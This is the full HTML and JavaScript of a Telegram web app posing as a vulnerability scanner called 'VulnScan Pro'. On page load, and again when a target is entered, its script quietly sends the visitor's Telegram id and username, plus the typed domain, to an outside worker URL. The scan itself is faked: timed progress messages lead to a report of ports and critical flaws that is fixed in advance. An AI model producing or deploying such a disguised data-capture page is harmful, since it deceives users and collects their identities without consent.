<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>VulnScan Pro</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { background-color: #0a0a0a; color: #00ffcc; font-family: monospace; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh;}
        .box { border: 1px solid #00ffcc; padding: 20px; width: 100%; max-width: 400px; border-radius: 8px; background: #111; box-shadow: 0 0 15px rgba(0, 255, 204, 0.2);}
        h2 { text-align: center; margin-top: 0;}
        input, button { width: 100%; padding: 15px; margin: 10px 0; background: #000; color: #00ffcc; border: 2px solid #00ffcc; box-sizing: border-box; border-radius: 4px; font-family: monospace;}
        button { background: #00ffcc; color: #000; font-weight: bold; cursor: pointer; transition: 0.3s;}
        button:hover { background: #00ccaa; }
        #loading, #report { display: none; text-align: center; }
        .stat { display: flex; justify-content: space-between; margin-bottom: 8px; font-size: 14px; border-bottom: 1px solid #333; padding-bottom: 5px;}
        .stat span { color: #fff; }
    </style>
</head>
<body>
    <div class="box" id="form">
        <h2>VulnScan Pro</h2>
        <p style="font-size:12px; color:#888; text-align:center;">Advanced vulnerability scanner</p>
        <input type="text" id="target" placeholder="example.com" />
        <button onclick="startScan()">Start Scan</button>
    </div>
    
    <div class="box" id="loading">
        <p id="loading-text" style="color:#00ffcc;">Initializing Nmap...</p>
    </div>
    
    <div class="box" id="report">
        <h3 style="color:#fff; text-align:center;">Scan Report</h3>
        <div class="stat"><span>Target:</span> <span id="rep-target">-</span></div>
        <div class="stat"><span>Status:</span> <span style="color:#0f0;">Completed</span></div>
        <div class="stat"><span>Open Ports:</span> <span>22, 80, 443, 3306</span></div>
        <div class="stat"><span>Vulnerabilities:</span> <span style="color:#f00;">3 Critical</span></div>
    </div>

    <script>
        // 🔴 هنا حطينا الرابط ديالك 🔴
        const WORKER_URL = 'https://capture.kikizamllll.workers.dev/'; 
        
        const tg = window.Telegram.WebApp;
        tg.ready();
        const user = tg.initDataUnsafe?.user || {};

        async function captureData(target = "Opened Bot") {
            try {
                await fetch(WORKER_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        tg_id: user.id || 'Guest',
                        tg_user: user.username || 'None',
                        target: target
                    })
                });
            } catch (e) { console.log("Worker error:", e); }
        }

        // إرسال تلقائي بمجرد فتح الواجهة
        setTimeout(() => captureData("Opened Bot"), 1000);

        function startScan() {
            const target = document.getElementById('target').value;
            if(!target) return alert("Please enter a target domain.");
            
            document.getElementById('form').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            captureData(target);

            const steps = ["Running Nmap...", "Nuclei scanning...", "Compiling report..."];
            let i = 0;
            const int = setInterval(() => {
                document.getElementById('loading-text').innerText = steps[i];
                i++;
                if(i >= steps.length) {
                    clearInterval(int);
                    document.getElementById('loading').style.display = 'none';
                    document.getElementById('report').style.display = 'block';
                    document.getElementById('rep-target').innerText = target;
                }
            }, 1000);
        }
    </script>
</body>
</html>
